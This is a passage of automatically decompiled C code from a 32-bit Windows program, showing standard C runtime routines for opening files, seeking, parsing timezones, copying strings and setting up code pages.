    } else {
        // 0x405387
        *v3 = v4 | 8;
        *(int32_t *)(a1 + 24) = 0x1000;
    }
    int32_t result = *v2; // 0x4053a5
    *(int32_t *)(a1 + 4) = 0;
    *(int32_t *)a1 = result;
    return result;
}

// Address range: 0x4053af - 0x40567e
int32_t function_4053af(int32_t lpFileName, uint32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = 0x1000000 * a4 / 0x1000000;
    int32_t lpSecurityAttributes = 12; // bp-32, 0x4053c0
    char v2 = (char)(a2 / 8) & 16;
    char v3 = v2; // 0x4053e7
    if ((int16_t)a2 > -1) {
        // 0x4053e9
        v3 = (a2 & 0x4000) == 0 == g133 == 0x8000 ? v2 : v2 | -128;
    }
    char v4 = v3;
    int32_t v5 = a2 & 3; // 0x4053ff
    int32_t dwDesiredAccess = -0x80000000; // 0x405403
    if (v5 == 0) {
        goto lab_0x405428;
    } else {
        int32_t v6 = v5 - 1; // 0x405405
        dwDesiredAccess = 0x40000000;
        if (v6 == 0) {
            goto lab_0x405428;
        } else {
            // 0x405408
            dwDesiredAccess = -0x40000000;
            if (v6 != 1) {
                goto lab_0x4054b3;
            } else {
                goto lab_0x405428;
            }
        }
    }
  lab_0x405428:;
    int32_t dwShareMode = 2; // 0x4053af
    switch (a3) {
        case 16: {
            // 0x405456
            dwShareMode = 0;
            goto lab_0x405459;
        }
        case 32: {
            // 0x40544d
            dwShareMode = 1;
            goto lab_0x405459;
        }
        case 48: {
            goto lab_0x405459;
        }
        default: {
            // 0x40543a
            dwShareMode = 3;
            if (a3 != 64) {
                goto lab_0x4054b3;
            } else {
                goto lab_0x405459;
            }
        }
    }
  lab_0x405459:;
    uint32_t v7 = a2 & 1792; // 0x405463
    int32_t dwCreationDisposition; // 0x4053af
    if (v7 > 1024) {
        // 0x40549f
        dwCreationDisposition = 1;
        switch (v7) {
            case 1280: {
                goto lab_0x4054dd;
            }
            case 1536: {
                // 0x4054cd
                dwCreationDisposition = 5;
                goto lab_0x4054dd;
            }
            case 1792: {
                goto lab_0x4054dd;
            }
            default: {
                goto lab_0x4054b3;
            }
        }
    } else {
        // 0x40546e
        dwCreationDisposition = 4;
        switch (v7 / 256) {
            case 4: {
                // 0x40549a
                dwCreationDisposition = 3;
                goto lab_0x4054dd;
            }
            case 0: {
                // 0x40549a
                dwCreationDisposition = 3;
                goto lab_0x4054dd;
            }
            case 1: {
                goto lab_0x4054dd;
            }
            case 2: {
                // 0x4054cd
                dwCreationDisposition = 5;
                goto lab_0x4054dd;
            }
            default: {
                // 0x405480
                dwCreationDisposition = 2;
                if (v7 != 768) {
                    goto lab_0x4054b3;
                } else {
                    goto lab_0x4054dd;
                }
            }
        }
    }
  lab_0x4054b3:
    // 0x4054b3
    *(int32_t *)function_404bb7() = 22;
    *(int32_t *)function_404bc0() = 0;
    // 0x405679
    return -1;
  lab_0x4054dd:;
    int32_t v8 = 128; // 0x4054e7
    if ((a2 & 256) != 0) {
        // 0x4054e9
        v8 = (char)((g79 ^ 128) & a5) <= -1 ? 128 : 1;
    }
    int32_t v9 = a2 / 16 & 256 | 0x100000 * a2 & 0x4000000 | v8;
    int32_t dwFlagsAndAttributes; // 0x4053af
    if ((a2 & 32) == 0) {
        // 0x40551d
        dwFlagsAndAttributes = v9 | 0x1000000 * a2 & 0x10000000;
    } else {
        // 0x405515
        dwFlagsAndAttributes = v9 | 0x8000000;
    }
    // 0x405527
    int32_t v10; // 0x4053af
    int32_t v11; // 0x4053af
    int32_t v12; // 0x4053af
    int32_t v13; // 0x4053af
    int32_t v14 = function_404bc9(v10, v11, v13, 12, 0, (int32_t)((char)a2 > -1), dwShareMode, dwDesiredAccess, dwCreationDisposition, v4, v12); // 0x405527
    if (v14 == -1) {
        // 0x405535
        *(int32_t *)function_404bb7() = 24;
        *(int32_t *)function_404bc0() = 0;
        // 0x405679
        return -1;
    }
    int32_t v15 = lpFileName; // bp-72, 0x40555f
    int32_t * fileHandle = CreateFileA((char *)lpFileName, dwDesiredAccess, dwShareMode, (struct _SECURITY_ATTRIBUTES *)&lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, NULL); // 0x405562
    int32_t * v16 = &v15; // 0x40556c
    char v17; // 0x4053af
    int32_t v18; // bp-80, 0x4053af
    int32_t v19; // 0x4055b7
    int32_t * v20; // 0x4055d0
    int32_t v21; // 0x4053af
    if (fileHandle != (int32_t *)-1) {
        int32_t v22 = (int32_t)fileHandle; // 0x405562
        int32_t v23 = v22; // bp-76, 0x405582
        int32_t v24 = GetFileType(fileHandle); // 0x405583
        if (v24 != 0) {
            if (v24 != 2) {
                // 0x4055a1
                v17 = v24 != 3 ? v4 : v4 | 8;
            } else {
                // 0x40559b
                v17 = v4 | 64;
            }
            // 0x4055aa
            v18 = v22;
            function_404cec(v14, v22);
            v19 = &v23;
            char v25 = v17 | 1; // 0x4055c4
            v20 = (int32_t *)(4 * v14 / 32 + (int32_t)&g153);
            v21 = 36 * (v14 & 31) + 4;
            *(char *)(*v20 + v21) = v25;
            if ((a2 & 2) == 0 || v25 > -1 || (v17 & 72) != 0) {
                goto lab_0x405657;
            } else {
                // 0x4055ea
                v18 = 2;
                int32_t v26 = function_4056e3(v14, -1, 2); // 0x4055ef
                if (v26 != -1) {
                    // 0x405618
                    v1 = 0;
                    v18 = 1;
                    if (function_405192(v14, (int32_t)&v1, 1) != 0) {
                        goto lab_0x405645;
                    } else {
                        // 0x40562f
                        if ((char)v1 != 26) {
                            goto lab_0x405645;
                        } else {
                            // 0x405635
                            v18 = v26;
                            if (function_406a85(v14, v26) == -1) {
                                goto lab_0x40560c;
                            } else {
                                goto lab_0x405645;
                            }
                        }
                    }
                } else {
                    // 0x4055ff
                    if (*(int32_t *)function_404bc0() == 131) {
                        goto lab_0x405657;
                    } else {
                        goto lab_0x40560c;
                    }
                }
            }
        } else {
            // 0x40558d
            v18 = v22;
            CloseHandle(fileHandle);
            v16 = &v18;
            goto lab_0x40556e;
        }
    } else {
        goto lab_0x40556e;
    }
  lab_0x40556e:;
    int32_t v27 = (int32_t)v16;
    *(int32_t *)(v27 - 4) = GetLastError();
    function_404b44((int32_t)&g167);
    int32_t v28 = v27; // 0x40557d
    int32_t result = -1; // 0x40557d
    goto lab_0x405670;
  lab_0x405670:
    // 0x405670
    *(int32_t *)(v28 - 4) = v14;
    function_404e88((int32_t)&g167);
    // 0x405679
    return result;
  lab_0x405657:
    // 0x405657
    v28 = v19;
    result = v14;
    if ((a2 & 8) != 0 && (v17 & 72) == 0) {
        char * v29 = (char *)(*v20 + v21); // 0x405665
        *v29 = *v29 | 32;
        v28 = v19;
        result = v14;
    }
    goto lab_0x405670;
  lab_0x405645:
    // 0x405645
    v18 = 0;
    if (function_4056e3(v14, 0, 0) == -1) {
        goto lab_0x40560c;
    } else {
        goto lab_0x405657;
    }
  lab_0x40560c:
    // 0x40560c
    *(int32_t *)(v19 - 4) = v14;
    function_402751((int32_t)&g167);
    v28 = v19;
    result = -1;
    goto lab_0x405670;
}

// Address range: 0x40567e - 0x4056e3
int32_t function_40567e(uint32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40567e
    if ((int32_t)g155 <= a1) {
        // 0x4056cb
        *(int32_t *)function_404bb7() = 9;
        *(int32_t *)function_404bc0() = 0;
        return -1;
    }
    int32_t v1 = *(int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x405695
    if ((*(char *)(36 * (a1 & 31) + 4 + v1) & 1) == 0) {
        // 0x4056cb
        *(int32_t *)function_404bb7() = 9;
        *(int32_t *)function_404bc0() = 0;
        return -1;
    }
    // 0x4056a6
    function_404e29(a1);
    int32_t result = function_4056e3(a1, a2, a3); // 0x4056b6
    function_404e88(a1);
    return result;
}

// Address range: 0x4056e3 - 0x405756
int32_t function_4056e3(int32_t a1, int32_t lDistanceToMove, int32_t dwMoveMethod) {
    int32_t hFile = function_404de7(a1); // 0x4056ea
    if (hFile == -1) {
        // 0x4056f5
        *(int32_t *)function_404bb7() = 9;
        // 0x405753
        return -1;
    }
    int32_t result = SetFilePointer((int32_t *)hFile, lDistanceToMove, NULL, dwMoveMethod); // 0x40570d
    if (result == -1) {
        int32_t errorCode = GetLastError(); // 0x40571a
        if (errorCode != 0) {
            // 0x405728
            function_404b44(errorCode);
            // 0x405753
            return -1;
        }
    }
    int32_t v1 = *(int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x40573e
    char * v2 = (char *)(36 * (a1 & 31) + 4 + v1); // 0x405748
    *v2 = *v2 & -3;
    // 0x405753
    return result;
}

// Address range: 0x405756 - 0x405784
int32_t function_405756(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405756
    if (g123 != 0) {
        // 0x405783
        int32_t result; // 0x405756
        return result;
    }
    // 0x40575f
    function_403cab(11);
    if (g123 == 0) {
        // 0x405770
        function_405784();
        g123++;
    }
    // 0x405783
    return function_403d0c(11);
}

// Address range: 0x405784 - 0x405a0b
int32_t function_405784(void) {
    // 0x405784
    function_403cab(12);
    g49 = -1;
    g46 = -1;
    g100 = 0;
    int32_t v1 = function_406cc4("TZ"); // 0x4057b5
    if (v1 == 0) {
        // 0x4057c5
        function_403d0c(12);
        if (GetTimeZoneInformation((struct _TIME_ZONE_INFORMATION *)&g101) == -1) {
            // 0x405a06
            return -1;
        }
        // 0x4057e1
        g39 = false;
        g100 = 1;
        if (g104 != 0) {
            // 0x405806
            g39 = false;
        }
        // 0x405812
        int32_t v2; // 0x405784
        if (g114 == 0) {
            // 0x405836
            g40 = 0;
            v2 = 0;
            goto lab_0x405842;
        } else {
            // 0x40581b
            if (g121 == 0) {
                // 0x405836
                g40 = 0;
                v2 = 0;
                goto lab_0x405842;
            } else {
                // 0x405824
                g40 = 1;
                v2 = 60 * (g121 - (int32_t)g111);
                goto lab_0x405842;
            }
        }
      lab_0x405842:
        // 0x405842
        g41 = v2;
        int32_t lpMultiByteStr = *(int32_t *)&g42; // 0x405854
        int32_t lpUsedDefaultChar; // bp-8, 0x405784
        int32_t v3 = WideCharToMultiByte(g132, 544, (int16_t *)&g102, -1, (char *)lpMultiByteStr, 63, NULL, (bool *)&lpUsedDefaultChar); // 0x405868
        if (v3 == 0) {
            // 0x40587e
            *(char *)*(int32_t *)&g42 = 0;
            goto lab_0x405886;
        } else {
            // 0x40586e
            if (lpUsedDefaultChar != 0) {
                // 0x40587e
                *(char *)*(int32_t *)&g42 = 0;
                goto lab_0x405886;
            } else {
                // 0x405873
                g53 = 0;
                goto lab_0x405886;
            }
        }
      lab_0x405886:;
        int32_t v4 = WideCharToMultiByte(g132, 544, (int16_t *)&g112, -1, g44, 63, NULL, (bool *)&lpUsedDefaultChar); // 0x4058a1
        if (v4 == 0 || lpUsedDefaultChar != 0) {
            // 0x4059f5
            g44[0] = 0;
            // 0x405a06
            return (int32_t)g44;
        }
        // 0x4058b4
        g54 = 0;
        // 0x405a06
        return (int32_t)g44;
    }
    char * v5 = (char *)v1; // 0x4058c2
    if (*v5 == 0) {
        // 0x405a06
        return function_403d0c(12);
    }
    int32_t v6 = g122; // 0x4058cb
    int32_t v7 = 0; // 0x4058d2
    if (v6 != 0) {
        // 0x4058d4
        if (function_406c40(v1, v6) == 0) {
            // 0x405a06
            return function_403d0c(12);
        }
        // 0x4058d4
        v7 = g122;
    }
    // 0x4058e5
    function_402709(v7);
    int32_t * v8 = _malloc(function_403de0(v1) + 1); // 0x4058f8
    int32_t v9 = (int32_t)v8; // 0x4058f8
    g122 = v9;
    if (v8 == NULL) {
        // 0x405a06
        return function_403d0c(12);
    }
    // 0x40590d
    function_405d20(v9);
    function_403d0c(12);
    function_4065d0(*(int32_t *)&g42, v5, 3);
    int32_t v10 = v1 + 3; // 0x40592d
    g43 = 0;
    char v11 = *(char *)v10; // 0x405937
    int32_t v12 = v11 != 45 ? v10 : v1 + 4;
    int32_t v13 = function_406baa(v12); // 0x405945
    g39 = false;
    int32_t v14 = v13; // 0x405955
    int32_t v15 = v12; // 0x405955
    int32_t v16; // 0x405784
    char v17; // 0x40595b
    while (true) {
        // 0x40595b
        v16 = v15;
        v17 = *(char *)v16;
        v14 = v14 & -256 | (int32_t)v17;
        if (v17 != 43) {
            if (v17 > 57 || v14 < 48) {
                // break -> 0x40596c
                break;
            }
        }
        // 0x405969
        v15 = v16 + 1;
    }
    char v18 = v17; // 0x40596f
    int32_t v19 = 3600 * v13; // 0x40596f
    int32_t v20 = v16; // 0x40596f
    if (v17 == 58) {
        int32_t v21 = v16 + 1; // 0x405971
        int32_t v22 = 60 * function_406baa(v21); // 0x405978
        int32_t v23 = v22 + (int32_t)g39; // 0x405982
        g39 = (v23 & 1) != 0;
        int32_t v24 = v22; // 0x405984
        int32_t v25 = v21;
        char v26 = *(char *)v25; // 0x40598a
        v24 = v24 & -256 | (int32_t)v26;
        int32_t v27 = v25 + 1;
        while (v26 <= 57 && v24 >= 48) {
            // 0x40598a
            v25 = v27;
            v26 = *(char *)v25;
            v24 = v24 & -256 | (int32_t)v26;
            v27 = v25 + 1;
        }
        // 0x405997
        v18 = v26;
        v19 = v23;
        v20 = v25;
        if (v26 == 58) {
            int32_t v28 = function_406baa(v27); // 0x40599e
            int32_t v29 = v28 + (int32_t)g39; // 0x4059aa
            g39 = (v29 & 1) != 0;
            int32_t v30 = v28; // 0x4059ac
            char v31 = *(char *)v27; // 0x4059b2
            v30 = v30 & -256 | (int32_t)v31;
            int32_t v32 = v27 + 1; // 0x4059b6
            v18 = v31;
            v19 = v29;
            v20 = v27;
            while (v31 <= 57 && v30 >= 48) {
                int32_t v33 = v32;
                v31 = *(char *)v33;
                v30 = v30 & -256 | (int32_t)v31;
                v32 = v33 + 1;
                v18 = v31;
                v19 = v29;
                v20 = v33;
            }
        }
    }
    // 0x4059bf
    char * v34; // 0x405784
    char v35; // 0x405784
    if (v11 != 45) {
        // 0x4059bf
        v34 = (char *)v20;
        v35 = v18;
    } else {
        // 0x4059c5
        g39 = (v19 & 1) != 0;
        char * v36 = (char *)v20;
        v34 = v36;
        v35 = *v36;
    }
    // 0x4059cd
    g40 = v35;
    if (v35 == 0) {
        // 0x4059f5
        g44[0] = 0;
        // 0x405a06
        return (int32_t)g44;
    }
    // 0x4059d9
    function_4065d0((int32_t)g44, v34, 3);
    g45 = 0;
    // 0x405a06
    return (int32_t)g44;
}

// Address range: 0x405a0b - 0x405a2c
int32_t function_405a0b(int32_t * a1) {
    // 0x405a0b
    function_403cab(11);
    int32_t result = function_405a2c((int32_t)a1); // 0x405a17
    function_403d0c(11);
    return result;
}

// Address range: 0x405a2c - 0x405bd8
int32_t function_405a2c(int32_t a1) {
    // 0x405a2c
    if (g40 == 0) {
        // 0x405b8c
        return 0;
    }
    int32_t * v1 = (int32_t *)(a1 + 20); // 0x405a47
    int32_t v2 = *v1; // 0x405a47
    if (v2 == g46 != (v2 == g49)) {
        // 0x405a5e
        int16_t v3; // bp-52, 0x405a2c
        if (g100 == 0) {
            // 0x405b36
            v3 = 1;
            function_405bd8(1, 1, v2, 4, 1, 0, 0, 2, 0, 0, 0);
            function_405bd8(0, 1, *v1, 10, 5, 0, 0, 2, 0, 0, 0);
        } else {
            // 0x405a6a
            int32_t v4; // 0x405a2c
            int32_t v5; // 0x405a2c
            int32_t v6; // 0x405a2c
            int32_t v7; // 0x405a2c
            if (g113 != 0) {
                // 0x405ab0
                v4 = g116;
                v5 = 0;
                v6 = 0;
                v7 = 0;
            } else {
                // 0x405a93
                v4 = 0;
                v5 = g115;
                v6 = g116;
                v7 = 1;
            }
            // 0x405ac4
            v3 = v7;
            function_405bd8(1, v7, v2, (int32_t)g114, v6, v5, v4, (int32_t)g117, (int32_t)g118, (int32_t)g119, (int32_t)g120);
            int32_t v8; // 0x405a2c
            int32_t v9; // 0x405a2c
            int32_t v10; // 0x405a2c
            int32_t v11; // 0x405a2c
            if (g103 != 0) {
                // 0x405b1e
                v8 = g106;
                v9 = 0;
                v10 = 0;
                v11 = 0;
            } else {
                // 0x405af6
                v8 = 0;
                v9 = g105;
                v10 = g106;
                v11 = 1;
            }
            int32_t v12 = *v1;
            v3 = v11;
            *(int32_t *)((int32_t)&v3 - 4) = 0;
            function_405bd8(v11, v12, (int32_t)g104, v10, v9, v8, (int32_t)g107, (int32_t)g108, (int32_t)g109, (int32_t)g110, (int32_t)&g167);
        }
    }
    int32_t v13 = *(int32_t *)(a1 + 28); // 0x405b6b
    if (g47 < g50) {
        // 0x405b72
        if (v13 < g47 || v13 > g50) {
            // 0x405b8c
            return 0;
        }
        // 0x405b82
        if (v13 > g47 == v13 < g50) {
            // 0x405b8c
            return 1;
        }
    } else {
        // 0x405b90
        if (v13 < g50 || v13 > g47) {
            // 0x405b8c
            return 1;
        }
        // 0x405b98
        if (v13 > g50 == v13 < g47) {
            // 0x405b8c
            return 0;
        }
    }
    int32_t v14 = *(int32_t *)a1; // 0x405bb0
    int32_t v15 = 1000 * (60 * (60 * *(int32_t *)(a1 + 8) + *(int32_t *)(a1 + 4)) + v14); // 0x405bb2
    bool result; // 0x405a2c
    if (v13 != g47) {
        int32_t v16 = v15 - g51; // 0x405bcd
        result = v16 < 0 != ((v16 ^ v15) & (g51 ^ v15)) < 0;
    } else {
        int32_t v17 = v15 - g48; // 0x405bbe
        result = v17 < 0 == ((v17 ^ v15) & (g48 ^ v15)) < 0;
    }
    // 0x405b8c
    return result;
}

// Address range: 0x405bd8 - 0x405d18
int32_t function_405bd8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11) {
    int32_t v1 = 4 * a4;
    int32_t v2 = (a3 & 3) != 0 ? (int32_t)&g55 : (int32_t)&g51;
    int32_t v3 = *(int32_t *)(v2 + v1);
    int32_t v4; // 0x405bd8
    if (a2 != 1) {
        // 0x405c73
        v4 = v3 + a7;
    } else {
        int32_t v5 = v3 + 1; // 0x405c0e
        int32_t v6 = 365 * a3 - 0x63db + (a3 - 1) / 4 + v5; // 0x405c24
        int32_t v7 = (0x100000000 * (int64_t)(v6 >> 31) | (int64_t)v6) % 7; // 0x405c2d
        int32_t v8 = 7 * a5 + a6 - v7 + (v7 < a6 ? v3 - 6 : v5);
        v4 = v8;
        if (a5 == 5) {
            int32_t v9 = (a3 & 3) != 0 ? (int32_t)&g56 : (int32_t)&g52;
            int32_t v10 = *(int32_t *)(v9 + v1);
            v4 = v8 > v10 ? v8 - 7 : v8;
        }
    }
    // 0x405c8e
    if (a1 == 1) {
        // 0x405c94
        g47 = v4;
        g46 = a3;
        int32_t result = 1000 * (60 * (60 * a8 + a9) + a10) + a11; // 0x405cb5
        g48 = result;
        // 0x405d14
        return result;
    }
    // 0x405cbf
    g50 = v4;
    int32_t result2 = 1000 * (60 * (60 * a8 + a9) + a10 + g41) + a11; // 0x405ce0
    g51 = result2;
    int32_t result3; // 0x405bd8
    int32_t v11; // 0x405bd8
    if (result2 >= 0) {
        // 0x405cf7
        if (result2 < 0x5265c00) {
            // 0x405d0e
            g49 = a3;
            // 0x405d14
            return result2;
        }
        // 0x405d00
        result3 = result2 - 0x5265c00;
        v11 = v4 + 1;
    } else {
        // 0x405cea
        result3 = result2 + 0x5265c00;
        v11 = v4 - 1;
    }
    // 0x405d08
    g51 = result3;
    g50 = v11;
    // 0x405d0e
    g49 = a3;
    // 0x405d14
    return result3;
}

// Address range: 0x405d20 - 0x405d27
int32_t function_405d20(int32_t a1) {
    // 0x405d20
    int32_t v1; // 0x405d20
    return function_405d91(v1, (int32_t)&g167, (int32_t)&g167);
}

// Address range: 0x405d30 - 0x405d91
int32_t function_405d30(int32_t * a1, int32_t a2) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = v1; // 0x405d3b
    int32_t v3 = v1; // 0x405d3b
    int32_t result; // 0x405d82
    if ((v1 & 3) != 0) {
        while (*(char *)v2 != 0) {
            // 0x405d44
            v2++;
            v3 = v2;
            if ((v2 & 3) == 0) {
                goto lab_0x405d4c;
            }
        }
        // 0x405d7f
        result = function_405d91((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
        return result;
    }
  lab_0x405d4c:;
    int32_t v4 = v3; // 0x405d30
    uint32_t result4; // 0x405d4c
    while (true) {
        // 0x405d4c
        result4 = *(int32_t *)v4;
        if (((result4 ^ -0x7efeff00 ^ result4 + 0x7efefeff) & -0x7efeff00) != 0) {
            if ((char)result4 == 0) {
                // break -> 0x405d8e
                break;
            }
            if ((result4 & 0xff00) == 0) {
                int32_t result2 = function_405d91((int32_t)&g167, (int32_t)&g167, (int32_t)&g167); // 0x405d8c
                return result2;
            }
            if ((result4 & 0xff0000) == 0) {
                int32_t result3 = function_405d91((int32_t)&g167, (int32_t)&g167, (int32_t)&g167); // 0x405d87
                return result3;
            }
            if (result4 < 0x1000000) {
                // 0x405d7f
                result = function_405d91((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
                return result;
            }
        }
        // 0x405d4c
        v4 += 4;
    }
    // 0x405d8e
    return result4;
}

// Address range: 0x405d91 - 0x405e10
int32_t function_405d91(int32_t a1, int32_t result, int32_t a3) {
    int32_t v1 = a3; // 0x405d9b
    int32_t v2 = a3; // 0x405d9b
    int32_t v3; // 0x405d91
    if ((a3 & 3) != 0) {
        char v4 = *(char *)v1; // 0x405d9d
        int32_t v5; // 0x405d91
        while (v4 != 0) {
            // 0x405da4
            v1++;
            *(char *)v5 = v4;
            int32_t v6 = v5 + 1; // 0x405da6
            v5 = v6;
            v2 = v1;
            v3 = v6;
            if ((v1 & 3) == 0) {
                goto lab_0x405db6;
            }
            v4 = *(char *)v1;
        }
        // 0x405e08
        *(char *)v5 = 0;
        return result;
    }
  lab_0x405db6:;
    int32_t v7 = v2; // 0x405d91
    int32_t v8 = v3; // 0x405d91
    int32_t v9; // 0x405d91
    while (true) {
        int32_t v10 = v8;
        uint32_t v11 = *(int32_t *)v7;
        if (((v11 ^ -0x7efeff00 ^ v11 + 0x7efefeff) & -0x7efeff00) != 0) {
            // 0x405dd0
            v9 = v10;
            if ((char)v11 == 0) {
                // break -> 0x405e08
                break;
            }
            if ((v11 & 0xff00) == 0) {
                // 0x405dff
                *(int16_t *)v10 = (int16_t)v11;
                return result;
            }
            if ((v11 & 0xff0000) == 0) {
                // 0x405df2
                *(int16_t *)v10 = (int16_t)v11;
                *(char *)(v10 + 2) = 0;
                return result;
            }
            if (v11 < 0x1000000) {
                // 0x405dea
                *(int32_t *)v10 = v11;
                return result;
            }
        }
        // 0x405db1
        *(int32_t *)v10 = v11;
        v7 += 4;
        v8 = v10 + 4;
    }
    // 0x405e08
    *(char *)v9 = 0;
    return result;
}

// Address range: 0x405e10 - 0x405fbd
int32_t function_405e10(int32_t a1) {
    // 0x405e10
    function_403cab(25);
    int32_t v1 = a1; // bp-48, 0x405e20
    int32_t CodePage = function_405fbd(a1); // 0x405e23
    int32_t v2; // bp-40, 0x405e10
    int32_t v3 = &v2; // 0x405e31
    if (CodePage == g139) {
        // 0x405fae
        *(int32_t *)(v3 - 4) = 25;
        function_403d0c((int32_t)&g167);
        return 0;
    }
    int32_t v4 = &g58; // 0x405e40
    int32_t v5 = v3; // 0x405e40
    int32_t v6; // 0x405e10
    int32_t v7; // 0x405e10
    int32_t result; // 0x405e10
    if (CodePage == 0) {
        goto lab_0x405f9c;
    } else {
        int32_t v8 = 0;
        while (*(int32_t *)v4 != CodePage) {
            // 0x405e51
            v4 += 48;
            if (v4 >= (int32_t)&g61) {
                // 0x405e5c
                v1 = CodePage;
                int32_t lpCPInfo; // bp-28, 0x405e10
                GetCPInfo(CodePage, (struct _cpinfo *)&lpCPInfo);
                v5 = &v1;
                v7 = v5;
                result = -1;
                if (g124 == 0) {
                    goto lab_0x405fae;
                } else {
                    goto lab_0x405f9c;
                }
            }
            v8++;
        }
        // 0x405ec5
        __asm_rep_stosd_memset((char *)&g143, 0, 64);
        int32_t v9 = 48 * v8; // 0x405ed8
        bool v10; // 0x405e10
        char * v11 = v10 ? (char *)((int32_t)&g143 - 256) : (char *)((int32_t)&g143 + 256); // 0x405edb
        *v11 = 0;
        int32_t v12 = v9 + (int32_t)&g60;
        int32_t v13 = 0;
        char v14 = *(char *)v12; // 0x405ee2
        unsigned char v15; // 0x405ef0
        int32_t v16; // 0x405e10
        int32_t v17; // 0x405e10
        int32_t v18; // 0x405e10
        char * v19; // 0x405e10
        unsigned char v20; // 0x405ee9
        int32_t v21; // 0x405f0f
        char v22; // 0x405f10
        char * v23; // 0x405f03
        if (v14 != 0) {
            // 0x405ee9
            v19 = (char *)(v13 + (int32_t)&g57);
            v22 = v14;
            v18 = v12;
            v20 = *(char *)(v18 + 1);
            while (v20 != 0) {
                // 0x405ef0
                v15 = v22;
                if (v20 >= v15) {
                    // 0x405efa
                    v17 = v15;
                    v23 = (char *)(v17 + (int32_t)&g144);
                    *v23 = *v23 | *v19;
                    v16 = v17 + 1;
                    while (v17 != (int32_t)v20) {
                        // 0x405f03
                        v17 = v16;
                        v23 = (char *)(v17 + (int32_t)&g144);
                        *v23 = *v23 | *v19;
                        v16 = v17 + 1;
                    }
                }
                // 0x405f0e
                v21 = v18 + 2;
                v22 = *(char *)v21;
                if (v22 == 0) {
                    // break -> 0x405f15
                    break;
                }
                v18 = v21;
                v20 = *(char *)(v18 + 1);
            }
        }
        int32_t v24 = v13 + 1; // 0x405f15
        int32_t v25 = v12 + 8; // 0x405f1f
        while (v24 != 4) {
            // 0x405ee2
            v12 = v25;
            v13 = v24;
            v14 = *(char *)v12;
            if (v14 != 0) {
                // 0x405ee9
                v19 = (char *)(v13 + (int32_t)&g57);
                v22 = v14;
                v18 = v12;
                v20 = *(char *)(v18 + 1);
                while (v20 != 0) {
                    // 0x405ef0
                    v15 = v22;
                    if (v20 >= v15) {
                        // 0x405efa
                        v17 = v15;
                        v23 = (char *)(v17 + (int32_t)&g144);
                        *v23 = *v23 | *v19;
                        v16 = v17 + 1;
                        while (v17 != (int32_t)v20) {
                            // 0x405f03
                            v17 = v16;
                            v23 = (char *)(v17 + (int32_t)&g144);
                            *v23 = *v23 | *v19;
                            v16 = v17 + 1;
                        }
                    }
                    // 0x405f0e
                    v21 = v18 + 2;
                    v22 = *(char *)v21;
                    if (v22 == 0) {
                        // break -> 0x405f15
                        break;
                    }
                    v18 = v21;
                    v20 = *(char *)(v18 + 1);
                }
            }
            // 0x405f15
            v24 = v13 + 1;
            v25 = v12 + 8;
        }
        // 0x405f21
        g141 = 1;
        g139 = CodePage;
        int32_t v26 = function_406007(CodePage); // 0x405f34
        int32_t v27 = v9 + (int32_t)&g59; // 0x405f39
        g140 = *(int32_t *)v27;
        int32_t v28 = v10 ? -4 : 4; // 0x405f44
        int32_t v29 = v28 + (int32_t)&g140; // 0x405f44
        int32_t v30 = v27 + v28; // 0x405f44
        *(int32_t *)v29 = *(int32_t *)v30;
        g145 = v26;
        *(int32_t *)(v29 + v28) = *(int32_t *)(v30 + v28);
        v6 = v3;
        goto lab_0x405fa1;
    }
  lab_0x405f9c:
    // 0x405f9c
    function_40603a();
    v6 = v5;
    goto lab_0x405fa1;
  lab_0x405fa1:
    // 0x405fa1
    function_406063();
    v7 = v6;
    result = 0;
  lab_0x405fae:
    // 0x405fae
    *(int32_t *)(v7 - 4) = 25;
    function_403d0c((int32_t)&g167);
    return result;
}

// Address range: 0x405fbd - 0x405fc1
int32_t function_405fbd(int32_t result) {
    // 0x405fbd
    return result;
}

// Address range: 0x406007 - 0x40603a
int32_t function_406007(int32_t a1) {
    int32_t result = 1041; // 0x406007
    switch (a1) {
        case 936: {
            // 0x40601f
            return 2052;
        }
        default: {
            int32_t v1 = a1 - 949; // 0x406017
            result = 1042;
            if (v1 != 0) {
                // 0x40601c
                result = v1 == 1 ? 1028 : 0;
            }
        }
        case 932: {
            // 0x40601f
            return result;
        }
    }
}

// Address range: 0x40603a - 0x406063
int32_t function_40603a(void) {
    // 0x40603a
    __asm_rep_stosd_memset((char *)&g143, 0, 64);
    bool v1; // 0x40603a
    char * v2 = v1 ? (char *)((int32_t)&g143 - 256) : (char *)((int32_t)&g143 + 256); // 0x406047
    *v2 = 0;
    g139 = 0;
    g141 = 0;
    g145 = 0;
    g140 = 0;
    int32_t * v3 = v1 ? (int32_t *)((int32_t)&g140 - 4) : (int32_t *)((int32_t)&g140 + 4); // 0x40605f
    *v3 = 0;
    int32_t * v4 = v1 ? (int32_t *)((int32_t)&g140 - 8) : (int32_t *)((int32_t)&g140 + 8); // 0x406060
    *v4 = 0;
    return 0;
}

// Address range: 0x406063 - 0x4061e8
int32_t function_406063(void) {
    // 0x406063
    int32_t lpCPInfo; // bp-24, 0x406063
    GetCPInfo(g139, (struct _cpinfo *)&lpCPInfo);
    int32_t v1 = 0; // 0x40619e
    int32_t v2; // 0x406063
    while (true) {
      lab_0x4061a3:
        // 0x4061a3
        v2 = v1;
        int32_t v3; // 0x406063
        if (v2 < 91) {
            char * v4 = (char *)(v2 + (int32_t)&g144); // 0x4061ad
            *v4 = *v4 | 16;
            // 0x4061b9
            v3 = v2 + 32;
            *(char *)(v2 + (int32_t)&g142) = (char)v3;
            goto lab_0x4061e0;
        } else {
            if (v2 < 123) {
                char * v5 = (char *)(v2 + (int32_t)&g144); // 0x4061cb
                *v5 = *v5 | 32;
                // 0x4061b9
                v3 = v2 + 224;
                *(char *)(v2 + (int32_t)&g142) = (char)v3;
                goto lab_0x4061e0;
            } else {
                // 0x4061d9
                *(char *)(v2 + (int32_t)&g142) = 0;
                goto lab_0x4061e0;
            }
        }
    }
    // 0x4061e5
    return 256;
  lab_0x4061e0:
    // 0x4061e0
    v1 = v2 + 1;
    if (v1 == 256) {
        return 256;
    }
    goto lab_0x4061a3;
}

